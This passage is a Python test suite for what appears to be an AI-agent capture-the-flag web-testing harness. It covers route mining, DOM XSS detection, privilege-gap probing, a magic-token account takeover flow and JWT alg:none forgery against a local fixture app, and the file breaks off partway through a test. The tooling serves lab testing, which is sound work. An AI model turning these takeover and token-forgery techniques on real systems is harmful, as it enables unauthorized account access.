            source = os.path.join(tmp, "DiceRoller.js")
            with open(source, "w", encoding="utf-8") as fh:
                fh.write(source_text)
            proc = run_full("jsmine.py", source)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            section = re.search(
                r'=== COMMAND-INJECTION FIELD SIGNALS.*?(?=\n===|\Z)',
                proc.stdout, re.S)
            self.assertIsNotNone(section, proc.stdout)
            body = section.group(0)
            self.assertIn(
                'POST   /api/roll location=json field=rollOptions seed="none"', body)
            self.assertIn(
                'GET    /api/ping?host=localhost location=query field=host seed="localhost"',
                body)
            self.assertIn(
                'GET    /api/tools/{...} location=path field=hostname seed=<dynamic>', body)
            self.assertIn(
                'GET    /api/tools/{...} location=header field=X-Diagnostic-Host seed="local"',
                body)
            self.assertIn(
                'POST   /api/check location=form field=host seed="localhost"', body)
            self.assertIn(
                'POST   /upload location=multipart field=filename seed=<dynamic>', body)
            self.assertIn("source=DiceRoller.js", body)


class JsmineDomResourceFileSignalTest(unittest.TestCase):
    """Browser resource loads are GET requests even though no fetch/Axios call
    exists. The exact Ottergram LFI sink lived in an image ``src`` and therefore
    appeared under ROUTES but vanished from methods.txt and automated probing."""

    def test_dynamic_resource_urls_become_ranked_get_file_read_signals(self):
        source_text = r'''
const image = <img src={`/api/post/image?file=${post.image_url}`} />;
const frame = <iframe src='/api/frame?path=preview.html'></iframe>;
const loader = jsx("script", {src:"/api/loader?filename=".concat(name)});
const theme = <link href={`/api/theme?download=${asset}`} />;
const staticAsset = <script src="/static/app.js"></script>;
'''
        with tempfile.TemporaryDirectory() as tmp:
            source = os.path.join(tmp, "PostView.js")
            with open(source, "w", encoding="utf-8") as fh:
                fh.write(source_text)
            proc = run_full("jsmine.py", source)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)

            methods = re.search(
                r'=== METHOD -> PATH.*?(?=\n===|\Z)', proc.stdout, re.S).group(0)
            for route in (
                    "/api/post/image?file={...}",
                    "/api/frame?path=preview.html",
                    "/api/loader?filename=probe",
                    "/api/theme?download={...}"):
                self.assertIn("GET    " + route, methods)
            self.assertNotIn("/static/app.js", methods)

            signals = re.search(
                r'=== FILE-READ FIELD SIGNALS.*?(?=\n===|\Z)',
                proc.stdout, re.S).group(0)
            for field in ("file", "path", "filename", "download"):
                self.assertIn("field=%s" % field, signals)
            self.assertIn("seed=<dynamic>", signals)
            self.assertIn("source=PostView.js", signals)

            ranked = re.search(
                r'=== HIGH-VALUE ACTION ROUTES.*?(?=\n===|\Z)',
                proc.stdout, re.S).group(0)
            self.assertEqual(ranked.count("score=120 GET"), 4, ranked)


class JsmineDomXssCandidateTest(unittest.TestCase):
    """Only a recognized browser-controlled source reaching an execution sink is a lead.

    The detector is intentionally not a taint engine: it should surface simple
    direct and local-variable flows with provenance while ignoring safe rendering
    and sink-only uses that have no known attacker-controlled source.
    """

    def test_hash_and_postmessage_reach_sinks_but_safe_rendering_does_not(self):
        source_text = r'''
const fragment = decodeURIComponent(location.hash.slice(1));
preview.innerHTML = fragment;
window.addEventListener("message", (event) => {
  preview.insertAdjacentHTML("beforeend", event.data);
});
const query = location.search;
preview.textContent = query;
const fixedMarkup = "<strong>trusted</strong>";
preview.innerHTML = fixedMarkup;
'''
        with tempfile.TemporaryDirectory() as tmp:
            source = os.path.join(tmp, "DomPreview.tsx")
            with open(source, "w", encoding="utf-8") as fh:
                fh.write(source_text)
            proc = run_full("jsmine.py", source)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            section = re.search(
                r'=== DOM XSS CANDIDATES.*?(?=\n===|\Z)', proc.stdout, re.S)
            self.assertIsNotNone(section, proc.stdout)
            body = section.group(0)
            self.assertIn("source=location.hash sink=innerHTML expression=fragment", body)
            self.assertIn("source=postMessage.data sink=insertAdjacentHTML expression=event.data", body)
            self.assertIn("origin=DomPreview.tsx", body)
            self.assertNotIn("textContent", body)
            self.assertNotIn("fixedMarkup", body)
            self.assertEqual(body.count("source="), 2, body)

    def test_realtime_payloads_reaching_html_sinks_are_candidates(self):
        source_text = r'''
const socket = io();
socket.on("account-updated", (payload) => {
  const notice = payload.message;
  feed.innerHTML = notice;
});
const stream = new EventSource("/api/events");
stream.onmessage = (event) => panel.insertAdjacentHTML("beforeend", event.data);
const ws = new WebSocket("wss://example.test/ws");
ws.addEventListener("message", (frame) => output.innerHTML = frame.data);
socket.on("safe-event", (payload) => safe.textContent = payload.message);
'''
        with tempfile.TemporaryDirectory() as tmp:
            source = os.path.join(tmp, "RealtimePanel.js")
            with open(source, "w", encoding="utf-8") as fh:
                fh.write(source_text)
            proc = run_full("jsmine.py", source)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            body = re.search(
                r'=== DOM XSS CANDIDATES.*?(?=\n===|\Z)', proc.stdout, re.S).group(0)
            self.assertIn("source=Socket.IO:account-updated sink=innerHTML expression=notice", body)
            self.assertIn("source=EventSource.message sink=insertAdjacentHTML expression=event.data", body)
            self.assertIn("source=WebSocket.message sink=innerHTML expression=frame.data", body)
            self.assertNotIn("safe.textContent", body)


class ProbeSkippedWriteTest(unittest.TestCase):
    """PUT/PATCH/DELETE targets mutate state, so probe.py holds them back unless
    --write is passed. They must not vanish silently — an operator needs to see what
    was held back (and why) instead of assuming the harness probed everything it was
    given."""

    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = fixture_app.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def test_write_targets_skipped_and_reported(self):
        with tempfile.TemporaryDirectory() as tmp:
            paths = os.path.join(tmp, "paths.txt")
            with open(paths, "w", encoding="utf-8") as fh:
                fh.write("GET /api/data\n")
                fh.write("DELETE /api/objects/1\n")
                fh.write("PUT /api/objects/1\n")
            proc = run_full("probe.py", "--base", self.base_url, "--token", "faketoken",
                            "--paths", paths, "--out", os.path.join(tmp, "out"))
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("skipped 2 write target(s)", proc.stdout)
            self.assertRegex(proc.stdout, r'SKIPPED\s+DELETE\s+/api/objects/1')
            self.assertRegex(proc.stdout, r'SKIPPED\s+PUT\s+/api/objects/1')
            self.assertIn("require --write", proc.stdout)

    def test_only_write_targets_reports_a_useful_message(self):
        with tempfile.TemporaryDirectory() as tmp:
            paths = os.path.join(tmp, "paths.txt")
            with open(paths, "w", encoding="utf-8") as fh:
                fh.write("DELETE /api/objects/1\n")
                fh.write("PUT /api/objects/1\n")
            proc = run_full("probe.py", "--base", self.base_url, "--token", "faketoken",
                            "--paths", paths, "--out", os.path.join(tmp, "out"))
            self.assertEqual(proc.returncode, 1, proc.stdout + proc.stderr)
            self.assertIn("skipped 2 write target(s)", proc.stdout,
                          "the skip report must still print even when nothing else is probed")
            self.assertIn("no non-write paths given", proc.stdout)


class ProbePublicAuthEnvelopeTest(unittest.TestCase):
    """A generic login/register/reset-initiation response must answer identically
    with and without a token by design -- that's not a leak. probe.py used to flag
    the Shady Oaks Financial /api/forgot-password response as NO-AUTH LEAK.
    is_expected_public_auth_response() now recognizes the narrow case (a known
    auth path, a 2xx/3xx status, and a JSON body made only of generic status/message
    keys) while any extra field -- a reset token, a user object -- still falls
    through to the leak verdict. Also covers the same live run's --methods output,
    which printed the server's global Access-Control-Allow-Methods policy as if it
    were evidence that route-specific handlers exist for every verb."""

    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = fixture_app.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def test_probe_treats_generic_reset_as_public_and_labels_cors_policy(self):
        with tempfile.TemporaryDirectory() as tmp:
            paths = os.path.join(tmp, "paths.txt")
            with open(paths, "w", encoding="utf-8") as fh:
                fh.write("POST /api/forgot-password\n")
            proc = run_full("probe.py", "--base", self.base_url, "--token", "faketoken",
                            "--paths", paths, "--methods", "--out", os.path.join(tmp, "out"))
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("public-endpoint — expected without auth", proc.stdout)
            self.assertNotIn("NO-AUTH LEAK", proc.stdout)
            self.assertIn("CORS policy -> GET,POST,PUT,PATCH,DELETE", proc.stdout)
            self.assertNotIn("OPTIONS ->", proc.stdout)

    def test_probe_keeps_sensitive_public_auth_fields_on_leak_path(self):
        with tempfile.TemporaryDirectory() as tmp:
            paths = os.path.join(tmp, "paths.txt")
            with open(paths, "w", encoding="utf-8") as fh:
                fh.write("POST /api/forgot-password?mode=leak\n")
            proc = run_full("probe.py", "--base", self.base_url, "--token", "faketoken",
                            "--paths", paths, "--out", os.path.join(tmp, "out"))
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("NO-AUTH LEAK", proc.stdout)
            self.assertNotIn("public-endpoint — expected without auth", proc.stdout)


class AuthquickRegressionTest(unittest.TestCase):
    """Vaultly-008 required preserving an unclaimed seeded identity, reading a
    magic token from a public inbox, trying that live artifact as registration
    ``code`` before intended redemption, then proving persistent password login.
    These tests make the state ordering, rate-limit handling, and full takeover
    verification permanent harness behavior."""

    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = fixture_app.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def setUp(self):
        fixture_app._reset_auth_state()

    def run_authquick(self, out, account, *extra):
        return run_full(
            "authquick.py", "--base", self.base_url,
            "--account", account, "--password", "HarnessPass1!",
            "--register-field", "orgName=Acme Executive Office",
            "--inbox-path", "/api/auth/inbox", "--delay", "0",
            "--max-probes", "12", "--out", out, *extra)

    def test_cross_flow_claim_precedes_verify_and_reaches_flag(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = self.run_authquick(
                tmp, "maya.chen@acme.test=Maya Chen",
                "--token-field", "token", "--token-field", "code",
                "--login-field", "next=/dashboard",
                "--objective-path", "/api/vault/breakglass",
                "--objective-method", "POST")
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("POSSIBLE ACCOUNT CLAIM field=code", proc.stdout)
            self.assertIn("PERSISTENT PASSWORD LOGIN confirmed", proc.stdout)
            expected = "bug" + "{AuthQuickRegression123}"
            self.assertIn("FLAG " + expected, proc.stdout)

            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                records = [json.loads(line) for line in fh if line.strip()]
            labels = [record["label"] for record in records]
            self.assertLess(labels.index("register-field:code"), labels.index("verify-claim"))
            self.assertLessEqual(len(records), 8, records)
            for record in records:
                request = record.get("request")
                if isinstance(request, dict):
                    self.assertTrue(all(isinstance(value, str) for value in request.values()))
                    self.assertFalse(any(str(key).startswith("$") for key in request))

            with open(os.path.join(tmp, "auth-state.json"), encoding="utf-8") as fh:
                state = json.load(fh)
            account = state["accounts"]["maya.chen@acme.test"]
            self.assertEqual(account["state"], "objective-reached")
            self.assertTrue(state["artifacts"][0]["consumed"])
            self.assertIn(expected, state["flags"])

    def test_normal_magic_redemption_burns_the_claim_state(self):
        email = "sofia.garcia@acme.test"
        requested = requests.post(
            self.base_url + "/api/auth/magic-link/request", data={"email": email},
            allow_redirects=False, timeout=5)
        self.assertEqual(requested.status_code, 303)
        messages = requests.get(
            self.base_url + "/api/auth/inbox", timeout=5).json()["messages"]
        link = [message["link"] for message in messages if message["to"] == email][-1]
        token = parse_qs(urlparse(link).query)["token"][0]
        redeemed = requests.get(
            self.base_url + "/api/auth/magic-link/verify", params={"token": token},
            allow_redirects=False, timeout=5)
        self.assertEqual(redeemed.status_code, 303)

        with tempfile.TemporaryDirectory() as tmp:
            proc = self.run_authquick(
                tmp, "sofia.garcia@acme.test=Sofia Garcia", "--token-field", "code")
            self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
            self.assertIn("no cross-flow account-claim transition", proc.stdout)
            self.assertNotIn("PERSISTENT PASSWORD LOGIN", proc.stdout)

    def test_rate_limit_is_untested_and_gateway_trips_circuit_breaker(self):
        cases = (
            ("rate@acme.test=Rate Limited", 2, "UNTESTED", "rate-limited"),
            ("gateway@acme.test=Gateway Failure", 3, "CIRCUIT BREAKER", None),
        )
        for account, expected_code, marker, state_name in cases:
            with self.subTest(account=account), tempfile.TemporaryDirectory() as tmp:
                fixture_app._reset_auth_state()
                proc = self.run_authquick(tmp, account, "--token-field", "code")
                self.assertEqual(proc.returncode, expected_code, proc.stdout + proc.stderr)
                self.assertIn(marker, proc.stdout)
                with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                    self.assertEqual(sum(1 for line in fh if line.strip()), 1)
                if state_name:
                    email = account.split("=", 1)[0]
                    with open(os.path.join(tmp, "auth-state.json"), encoding="utf-8") as fh:
                        state = json.load(fh)
                    self.assertEqual(state["accounts"][email]["state"], state_name)


class ProbePrivilegeGapTest(unittest.TestCase):
    """Authenticated-vs-anonymous is only two of the three identities that matter.

    From Ottergram (BugForge), where admin creds were handed over at the start:
    every route under /api/admin enforced the role except DELETE /api/admin/posts/:id,
    which only checked that a token existed. As admin that DELETE succeeding is correct
    behaviour; anonymously it 401s. Both of probe.py's original identities therefore saw
    a healthy route, and the flag sat in the response body of a request the harness had
    no reason to send. A second, low-privilege account is what separates them.

    Two independent detectors, because each covers the other's blind spot: the route
    name (/admin/...) needs no peers, and peer inconsistency inside a route group needs
    no recognisable name."""

    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = fixture_app.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    ADMIN_PATHS = ("GET /api/admin\n"
                   "GET /api/admin/flagged-posts\n"
                   "POST /api/admin/posts/1/approve\n"
                   "DELETE /api/admin/posts/1\n")

    def _run(self, tmp, paths_text, *extra):
        paths = os.path.join(tmp, "paths.txt")
        with open(paths, "w", encoding="utf-8") as fh:
            fh.write(paths_text)
        return run_full("probe.py", "--base", self.base_url, "--token", "admin-token",
                        "--paths", paths, "--write", "--out", os.path.join(tmp, "out"),
                        *extra)

    def test_lowpriv_identity_exposes_the_missing_guard(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = self._run(tmp, self.ADMIN_PATHS, "--lowpriv-token", "user-token")
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("PRIVILEGE GAP: DELETE /api/admin/posts/1", proc.stdout)
            self.assertIn("privilege gaps: 1", proc.stdout)
            # The three guarded siblings must not be reported.
            for guarded in ("/api/admin/flagged-posts", "/api/admin/posts/1/approve"):
                self.assertNotIn("PRIVILEGE GAP: %s" % guarded, proc.stdout,
                                 "a route that refuses the low-priv identity is not a gap")

    def test_auth_versus_anonymous_alone_is_blind_to_it(self):
        """The regression this whole feature exists for: without the second identity
        the same run over the same routes reports nothing wrong."""
        with tempfile.TemporaryDirectory() as tmp:
            proc = self._run(tmp, self.ADMIN_PATHS)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertNotIn("PRIVILEGE GAP", proc.stdout)
            self.assertNotIn("NO-AUTH", proc.stdout.split("real routes:")[-1])

    def test_flag_in_the_lowpriv_response_is_scanned_and_saved(self):
        """The flag existed only in the low-priv response body. If that identity's
        responses aren't scanned and written to disk like the other two, the harness
        sends the winning request and throws the answer away."""
        with tempfile.TemporaryDirectory() as tmp:
            proc = self._run(tmp, "DELETE /api/admin/posts/1\n",
                             "--lowpriv-token", "user-token")
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn(fixture_app.BFLA_FLAG, proc.stdout)
            self.assertIn("(lowpriv)", proc.stdout,
                          "the flag must be attributed to the identity that earned it")
            saved = os.path.join(tmp, "out", "delete.api_admin_posts_1.lowpriv.txt")
            self.assertTrue(os.path.isfile(saved), os.listdir(os.path.join(tmp, "out")))
            with open(saved, encoding="utf-8") as fh:
                self.assertIn(fixture_app.BFLA_FLAG, fh.read())

    def test_peer_inconsistency_finds_a_group_with_no_privileged_name(self):
        """/api/reports says nothing about privilege. Two siblings deny the low-priv
        identity and one does not — that inconsistency is the entire signal."""
        with tempfile.TemporaryDirectory() as tmp:
            proc = self._run(tmp,
                             "POST /api/reports/1/resolve\n"
                             "POST /api/reports/1/escalate\n"
                             "DELETE /api/reports/1\n",
                             "--lowpriv-token", "user-token")
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("PRIVILEGE GAP: DELETE /api/reports/1", proc.stdout)
            self.assertIn("sibling route(s) under /api/reports", proc.stdout)

    def test_ordinary_authenticated_group_is_not_a_gap(self):
        """Every identity may use /api/feed. Reporting that would make the verdict
        worthless on any app with a public feed."""
        with tempfile.TemporaryDirectory() as tmp:
            proc = self._run(tmp, "GET /api/feed\nGET /api/feed/1\n",
                             "--lowpriv-token", "user-token")
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertNotIn("PRIVILEGE GAP", proc.stdout)
            self.assertIn("no route treated the low-priv identity as privileged", proc.stdout)

    def test_write_verb_tests_lowpriv_before_the_object_is_consumed(self):
        """Found by running this feature against the live target, not by unit test.

        A DELETE is consumed by whichever identity fires it first. Probing privileged-
        first reported "admin 200, low-priv 404" on the real Ottergram box — a false
        negative on the very bug the feature exists to find, because the low-priv
        request landed on an object that no longer existed. The low-priv identity must
        go first on write verbs, and the now-stale privileged result must be labelled
        inconclusive rather than counted as a clean negative."""
        fixture_app.DELETED_POSTS.clear()
        with tempfile.TemporaryDirectory() as tmp:
            proc = self._run(tmp, "DELETE /api/admin/posts/2\n",
                             "--lowpriv-token", "user-token")
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("PRIVILEGE GAP: DELETE /api/admin/posts/2", proc.stdout,
                          "privileged-first ordering would have hidden this behind a 404")
            self.assertIn(fixture_app.BFLA_FLAG, proc.stdout)
            self.assertIn("INCONCLUSIVE", proc.stdout)
            self.assertIn("already consumed this object", proc.stdout)

    def test_skipped_write_on_a_privileged_route_says_so(self):
        """Without --write the winning request is never sent. The skip notice has to
        name that risk, not just list what it held back."""
        with tempfile.TemporaryDirectory() as tmp:
            paths = os.path.join(tmp, "paths.txt")
            with open(paths, "w", encoding="utf-8") as fh:
                fh.write("GET /api/admin\nDELETE /api/admin/posts/1\n")
            proc = run_full("probe.py", "--base", self.base_url, "--token", "admin-token",
                            "--lowpriv-token", "user-token", "--paths", paths,
                            "--out", os.path.join(tmp, "out"))
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("missing function-level guards", proc.stdout)
            self.assertIn("Rerun with --write", proc.stdout)


class FlaghookReportsBeforeVerifyingTest(unittest.TestCase):
    """A flag the user cannot see yet is worth nothing on a timed scoreboard.

    The hook blocks the turn (exit 2), so whatever it says first is what happens first.
    It used to lead with "verify it before submitting", which cost a full round trip
    before the flag was ever shown. Verification still has to happen — labs serve
    decoys — it just must not gate the reveal."""

    def _fire(self, flag):
        return run_full("flaghook.py", input_text=json.dumps({"output": flag}))

    def test_hook_orders_reporting_ahead_of_verification(self):
        flag = "bug" + "{OrderingRegression_%s}" % os.urandom(4).hex()
        proc = self._fire(flag)
        self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
        msg = proc.stderr
        self.assertIn(flag, msg)
        report_at = msg.upper().find("REPORT THIS FLAG TO THE USER")
        verify_at = msg.lower().find("verify it against a fresh")
        self.assertGreater(report_at, -1, "the hook must tell the agent to report the flag")
        self.assertGreater(verify_at, -1, "verification guidance must survive the reorder")
        self.assertLess(report_at, verify_at,
                        "reporting must be instructed before verification, not after")
        self.assertIn("before any further tool calls", msg)


class JwtquickBaselineRejectionTest(unittest.TestCase):
    """--test must point at a route that actually denies the caller's own token before
    any forged candidate is fired. Firing candidates against a baseline that never
    denied you (a public route, an SPA fallback, a timed-out request, or a request
    that failed outright) can't distinguish a real bypass from a route that was never
    protected in the first place -- so all of those must short-circuit to INCONCLUSIVE
    (exit 2) instead of printing a forged-token verdict."""

    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = fixture_app.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def test_non_denying_baseline_is_inconclusive(self):
        # fixture_app answers "/" with a 200 SPA shell for everyone -- never a denial
        token = make_jwt({"id": 1, "role": "user"}, "irrelevant")
        proc = run_full("jwtquick.py", "--token", token, "--no-crack",
                        "--base", self.base_url, "--test", "/")
        self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
        self.assertIn("INCONCLUSIVE", proc.stdout)
        self.assertIn("must be a route that refuses the original token", proc.stdout)
        self.assertNotIn("firing", proc.stdout,
                         "forged candidates must never fire against an unproven baseline")

    def test_styled_denial_page_does_not_tag_every_forgery_as_a_flag(self):
        """A refusing route that answers in styled HTML must still read as rejected.

        jwtquick's flag pattern keeps a wildcard prefix on purpose, so a lab can
        use a prefix this harness has never seen. With `[^}\\n]` as the payload,
        though, any word followed by a braced block matched -- and a hit here is
        unconditional success that overrides the rejected/bypass verdict. One
        stylesheet in a block page therefore tagged every forgery FLAG and
        reported a bypass that never happened.
        """
        token = make_jwt({"id": 1, "role": "user"}, "irrelevant")
        proc = run_full("jwtquick.py", "--token", token, "--no-crack",
                        "--base", self.base_url, "--test", "/api/jwt-styled-denial")
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        # The baseline denies, so candidates do fire -- and every one of them
        # comes back to the same 403 block page.
        self.assertIn("firing", proc.stdout)
        self.assertIn("[rejected]", proc.stdout)
        # The CSS still shows up in each line's body preview, which is correct;
        # what must not appear is a flag verdict derived from it.
        self.assertNotIn("FLAG", proc.stdout)
        self.assertNotIn("POSSIBLE BYPASS", proc.stdout)

    def test_unreachable_baseline_is_inconclusive(self):
        # port 1 on loopback: nothing listens there, so this fails fast (ECONNREFUSED)
        # rather than waiting out jwtquick's own 20s request timeout
        token = make_jwt({"id": 1, "role": "user"}, "irrelevant")
        proc = run_full("jwtquick.py", "--token", token, "--no-crack",
                        "--base", "http://127.0.0.1:1", "--test", "/", timeout=30)
        self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
        self.assertIn("INCONCLUSIVE", proc.stdout)
        self.assertNotIn("firing", proc.stdout)


class JwtquickCookieTransportTest(unittest.TestCase):
    """A low-privilege denial does not prove that a JWT reached the application.

    The same 401/403 can result when a cookie-authenticated app silently ignores a
    Bearer header. A known authenticated control must distinguish the real token
    from an invalid token over the selected transport before forged candidates run.
    """

    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = fixture_app.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def test_cookie_transport_control_and_roleless_identity_swap(self):
        token = make_jwt({"id": 2, "username": "user"}, "irrelevant")
        proc = run_full(
            "jwtquick.py", "--token", token, "--no-crack", "--base", self.base_url,
            "--control", "/api/jwt-cookie/me", "--test", "/api/jwt-cookie/admin",
            "--cookie-name", "auth_token", "--target-id", "1")
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        self.assertIn("transport verified", proc.stdout)
        self.assertIn("no privilege claim", proc.stdout)
        self.assertIn("alg:none:id=1", proc.stdout)
        self.assertIn("POSSIBLE BYPASS", proc.stdout)

    def test_wrong_bearer_transport_fails_control_before_forgery(self):
        token = make_jwt({"id": 2, "username": "user"}, "irrelevant")
        proc = run_full(
            "jwtquick.py", "--token", token, "--no-crack", "--base", self.base_url,
            "--control", "/api/jwt-cookie/me", "--test", "/api/jwt-cookie/admin")
        self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
        self.assertIn("was not proven", proc.stdout)
        self.assertNotIn("firing", proc.stdout)


class JsharvestReharvestTest(unittest.TestCase):
    """A second jsharvest.py pass over the same --out dir (e.g. re-running after
    login) must reuse a byte-identical bundle/source map instead of piling up
    app_2.js / mapped.js_2.map copies of content that hasn't changed -- only
    genuinely new or changed content should get a versioned filename."""

    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = fixture_app.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def test_identical_assets_are_reused_not_versioned(self):
        with tempfile.TemporaryDirectory() as tmp:
            first = run_full("jsharvest.py", "--base", self.base_url, "--out", tmp)
            second = run_full("jsharvest.py", "--base", self.base_url, "--out", tmp)
            self.assertEqual(first.returncode, 0, first.stdout + first.stderr)
            self.assertEqual(second.returncode, 0, second.stdout + second.stderr)
            self.assertTrue(os.path.isfile(os.path.join(tmp, "app.js")))
            self.assertTrue(os.path.isfile(os.path.join(tmp, "mapped.js")))
            self.assertTrue(os.path.isfile(os.path.join(tmp, "mapped.js.map")))
            self.assertFalse(os.path.exists(os.path.join(tmp, "app_2.js")))
            self.assertFalse(os.path.exists(os.path.join(tmp, "mapped_2.js")))
            self.assertFalse(os.path.exists(os.path.join(tmp, "mapped.js_2.map")))
            self.assertIn("reused 5 identical asset(s)", second.stdout,
                          second.stdout + second.stderr)


class FurHireMethodExtractionTest(unittest.TestCase):
    """Exact call shapes that produced 21 routes and zero methods on FurHire-014."""

    def test_fetch_and_custom_wrapper_methods_are_balanced_and_probe_ready(self):
        bundle = r'''
async function apiRequest(url, options = {}) {
  return fetch(url, {...options, headers: {...options.headers}});
}
window.FurHire = { apiRequest };
FurHire.apiRequest('/api/profile');
FurHire.apiRequest(`/api/jobs/${jobId}`, {
  method: 'PUT',
  body: JSON.stringify({nested: {value: 1}})
});
fetch('/api/account/recover', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify(data)
});
'''
        with tempfile.TemporaryDirectory() as tmp:
            with open(os.path.join(tmp, "furhire.js"), "w", encoding="utf-8") as fh:
                fh.write(bundle)
            proc = run_full("jsmine.py", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            section = re.search(r'=== METHOD -> PATH.*?(?=\n===|\Z)', proc.stdout, re.S)
            self.assertIsNotNone(section, proc.stdout)
            body = section.group(0)
            self.assertIn("GET    /api/profile", body)
            self.assertIn("PUT    /api/jobs/{...}", body)
            self.assertIn("POST   /api/account/recover", body)
            self.assertIn("HIGH-VALUE ACTION ROUTES", proc.stdout)
            self.assertRegex(proc.stdout, r'score=100 POST\s+/api/account/recover')

    def test_nonzero_routes_with_zero_methods_warns_loudly(self):
        with tempfile.TemporaryDirectory() as tmp:
            with open(os.path.join(tmp, "route-only.js"), "w", encoding="utf-8") as fh:
                fh.write('const recoveryPath = "/api/account/recover";')
            out = run("jsmine.py", tmp)
            self.assertIn("=== ROUTES (1) ===", out)
            self.assertIn("=== METHOD -> PATH (0) ===", out)
            self.assertIn("HIGH PRIORITY", out)


class GraphqlOperationMiningTest(unittest.TestCase):
    def test_full_operation_identity_signal_and_provenance_are_preserved(self):
        bundle = r'''
const LOG_ACTIVITY_MUTATION = `
  mutation LogActivity($event: String!, $userId: ID, $metadata: String) {
    logActivity(event: $event, userId: $userId, metadata: $metadata) {
      id
      event
      timestamp
    }
  }
`;
'''
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "activity.js")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(bundle)
            proc = run_full("jsmine.py", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("=== GRAPHQL OPERATIONS (1) ===", proc.stdout)
            self.assertIn("mutation LogActivity", proc.stdout)
            self.assertIn("vars=event,userId,metadata", proc.stdout)
            self.assertIn("identity-vars=userId", proc.stdout)
            self.assertIn("roots=logActivity", proc.stdout)
            self.assertIn("sources=activity.js", proc.stdout)
            self.assertIn("logActivity(event: $event, userId: $userId", proc.stdout)
            self.assertIn("=== GRAPHQL IDENTITY SIGNALS (1) ===", proc.stdout)

    def test_hash_comments_never_drop_an_operation_or_hide_its_root(self):
        """A ``#`` comment is prose, not structure.

        Applying JS string rules inside a GraphQL document silently lost work:
        an apostrophe opened a quote that never closed, so the whole operation
        vanished, and a leading comment hid the root resolver — the one field
        that feeds graphqlquick.py's --root. Braces named in a comment are not
        selection braces, in real-newline and minified ``\\n`` bundles alike.
        """
        bundle = r'''
const APOSTROPHE = `
  query FirstOp($aId: ID!) {
    # it's the first, and returns { id
    account(id: $aId) { balance }
  }
`;
const AFTER = `query SecondOp($bId: ID!) { later(id: $bId) { secret } }`;
var MINIFIED = "query Minified($zId: ID!) {\n  # it's minified { here\n  zed(id: $zId) {\n    token\n  }\n}";
const STRING_ARG = `query StringArg($q: String!) { search(filter: "{\"role\":\"admin\"}", term: $q) { id } }`;
'''
        with tempfile.TemporaryDirectory() as tmp:
            with open(os.path.join(tmp, "comments.js"), "w", encoding="utf-8") as fh:
                fh.write(bundle)
            proc = run_full("jsmine.py", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("=== GRAPHQL OPERATIONS (4) ===", proc.stdout)
            for name, root in (("FirstOp", "account"), ("SecondOp", "later"),
                               ("Minified", "zed"), ("StringArg", "search")):
                self.assertIn("query %s" % name, proc.stdout)
                self.assertIn("roots=%s" % root, proc.stdout)
            # A quoted brace is still structure-free, and the comment text
            # survives in the emitted operation because it can carry a hint.
            self.assertIn('filter: "{\\"role\\":\\"admin\\"}"', proc.stdout)
            self.assertIn("# it's the first", proc.stdout)

    def test_anonymous_operations_mine_without_javascript_false_positives(self):
        """`query { ... }` is a valid operation and common in hand-written clients.

        Mining nameless operations means the keyword alone is the only signal, and
        `function query() {` / `async query(a, b) {` are ordinary JavaScript that
        would otherwise be mined as GraphQL. Two discriminators keep it honest: a
        nameless operation taking arguments always declares `$vars`, and a
        selection set never contains JS statement syntax. Bare shorthand carries
        no keyword at all, so it is only trusted inside a gql`` tag.

        The minified querySelector lines are the case a live React bundle caught
        and the hand-written ones missed: with the name allowed to sit flush
        against the keyword, `document.querySelectorAll(x)` splits into the
        keyword `query` plus the name `Selector`, and the argument pattern then
        spans hundreds of non-brace characters to reach an unrelated `{`.
        """
        bundle = '''
const A = `query { users { id email role } }`;
